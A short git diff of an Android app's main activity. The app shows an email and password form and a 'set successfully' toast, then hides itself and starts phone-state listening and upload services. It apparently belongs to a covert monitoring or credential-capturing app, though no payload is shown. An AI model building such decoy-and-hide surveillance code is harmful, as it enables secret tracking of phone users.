@@ -14,6 +14,7 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
+
 public class MainActivity extends AppCompatActivity {
     private EditText emailText;
     private EditText pwdText;
@@ -24,7 +25,6 @@ public class MainActivity extends AppCompatActivity {
 
         try{
             Thread.sleep(2000);
-            MyUploadService.InitUploadService();
             registerPhoneStateListener();
             startLocalService();
 
@@ -34,23 +34,24 @@ public class MainActivity extends AppCompatActivity {
         }catch (Exception e ){
 
         }
-        /*
+
         setContentView(R.layout.activity_main);
         Button button = findViewById(R.id.login_button);
-        emailText = findViewById(R.id.email_text);/pwdText = findViewById(R.id.pwd_text);
+        emailText = findViewById(R.id.email_text);
+        pwdText = findViewById(R.id.pwd_text);
         button.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 String email = emailText.getText().toString();
                 Log.d("OnClick", email);
                 Toast.makeText(MainActivity.this, "设置成功", Toast.LENGTH_SHORT).show();
-                MyUploadService.InitUploadService();
-                registerPhoneStateListener();
-                startLocalService();
+                //MyUploadService.InitUploadService();
+                //registerPhoneStateListener();
+                //startLocalService();
 
                 moveTaskToBack(true);
             }
-        });*/
+        });
     }
     private void registerPhoneStateListener() {
         Intent intent = new Intent(this, PhoneListenService.class);
